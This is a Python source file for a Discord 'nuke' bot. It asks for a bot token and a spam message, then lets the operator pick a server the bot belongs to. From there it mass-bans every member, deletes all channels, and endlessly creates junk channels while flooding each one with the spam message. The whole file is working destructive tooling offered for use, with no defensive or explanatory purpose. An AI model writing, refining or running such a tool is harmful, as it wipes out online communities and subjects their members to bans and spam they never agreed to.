import discord
from discord.ext import commands
import asyncio
import threading
import random
import pyfiglet
import shutil
from colorama import Fore, Style

# Create banner
terminal_width = shutil.get_terminal_size().columns
banner = pyfiglet.figlet_format("@2hco")
for line in banner.splitlines():
    print(Fore.BLUE + line.center(terminal_width) + Style.RESET_ALL)

# Prompt for token and message
TOKEN = input(Fore.CYAN + "[?] Enter your bot token: " + Style.RESET_ALL).strip()
SPAM_MESSAGE = input(Fore.CYAN + "[?] Enter your spam message: " + Style.RESET_ALL).strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

stop_spam = False
spam_tasks = []
nuking_task = None
selected_guild = None

def random_name():
    words = ['FAST', 'BOOSTED', 'NUKED', 'SPAMMED', 'GONE']
    return f"{random.choice(words)}-{random.randint(1000,9999)}"

async def safe_ban(member):
    try:
        await member.ban(reason="Nuked by FastBoosters")
        print(f"Banned {member}")
    except Exception as e:
        print(f"Failed to ban {member}: {e}")

async def safe_delete_channel(channel):
    try:
        await channel.delete()
        print(f"Deleted channel {channel.name}")
    except Exception as e:
        print(f"Failed to delete channel {channel.name}: {e}")

async def spam_create_channels(guild):
    global stop_spam
    while not stop_spam:
        try:
            name = random_name()
            await guild.create_text_channel(name)
            print(f"Created channel {name}")
        except Exception as e:
            print(f"Channel create/spam error: {e}")
        await asyncio.sleep(0.3)

async def spam_send_messages(guild):
    global stop_spam
    while not stop_spam:
        channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
        if not channels:
            print("No channels available to spam messages.")
            await asyncio.sleep(0.3)
            continue
        send_tasks = []
        for ch in channels:
            send_tasks.append(ch.send(SPAM_MESSAGE))
        results = await asyncio.gather(*send_tasks, return_exceptions=True)
        for ch, res in zip(channels, results):
            if isinstance(res, Exception):
                print(f"Failed to send message in channel {ch.name}: {res}")
            else:
                print(f"Sent spam message in channel {ch.name}")
        await asyncio.sleep(0.3)

async def full_nuke(guild):
    global stop_spam, spam_tasks

    stop_spam = False
    spam_tasks.clear()

    print(f"Starting full nuke on guild: {guild.name} (ID: {guild.id})")

    print("Mass banning members (everyone)...")
    members_to_ban = [m for m in guild.members if m != guild.me]
    for member in members_to_ban:
        await safe_ban(member)
        await asyncio.sleep(0.3)

    print("Deleting all channels...")
    await asyncio.gather(*(safe_delete_channel(ch) for ch in guild.channels))

    print("Starting spamming channels and sending spam messages in all channels...")

    spam_tasks.append(asyncio.create_task(spam_create_channels(guild)))
    spam_tasks.append(asyncio.create_task(spam_send_messages(guild)))

async def stop_all():
    global stop_spam, spam_tasks, nuking_task
    stop_spam = True
    if nuking_task and not nuking_task.done():
        nuking_task.cancel()
    for task in spam_tasks:
        task.cancel()
    spam_tasks.clear()
    print("All spam tasks stopped.")

def start_cli(loop):
    global nuking_task, selected_guild
    while True:
        if selected_guild is None:
            guilds = bot.guilds
            print("\nBot is in the following guilds:")
            for i, g in enumerate(guilds, start=1):
                print(f"{i}. {g.name} (ID: {g.id}) Members: {g.member_count}")
            try:
                choice = int(input("Enter the number of the guild to target: "))
                if 1 <= choice <= len(guilds):
                    selected_guild = guilds[choice - 1]
                    print(f"Selected guild: {selected_guild.name}\n")
                else:
                    print("Invalid choice, try again.")
            except ValueError:
                print("Please enter a valid number.")
        else:
            cmd = input("Command (start/stop/change/exit): ").lower().strip()
            if cmd == "start":
                if nuking_task and not nuking_task.done():
                    print("Nuke already running.")
                else:
                    print("Starting full nuke...")
                    nuking_task = asyncio.run_coroutine_threadsafe(full_nuke(selected_guild), loop)
            elif cmd == "stop":
                asyncio.run_coroutine_threadsafe(stop_all(), loop)
            elif cmd == "change":
                if nuking_task and not nuking_task.done():
                    print("Please stop the current nuke first.")
                else:
                    selected_guild = None
            elif cmd == "exit":
                asyncio.run_coroutine_threadsafe(stop_all(), loop)
                asyncio.run_coroutine_threadsafe(bot.close(), loop)
                break
            else:
                print("Unknown command.")

@bot.event
async def on_ready():
    print(f"Bot ready as {bot.user}")
    loop = asyncio.get_event_loop()
    threading.Thread(target=start_cli, args=(loop,), daemon=True).start()

bot.run(TOKEN)
